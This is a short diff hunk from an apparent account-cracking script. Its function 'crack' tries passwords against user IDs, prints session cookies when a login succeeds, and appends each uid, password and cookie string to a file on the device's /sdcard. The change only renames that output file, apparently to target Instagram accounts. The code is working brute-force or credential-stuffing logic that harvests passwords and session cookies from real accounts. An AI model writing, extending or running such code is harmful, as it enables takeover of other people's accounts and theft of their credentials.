@@ -159,7 +159,7 @@ def crack(uid, password_list, total_count):
                 cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                 print("Cookies:", cookie_str)
-                open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
+                open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
                 oks.append(uid)
                 return True
             elif 'challenge_required' in response.text:
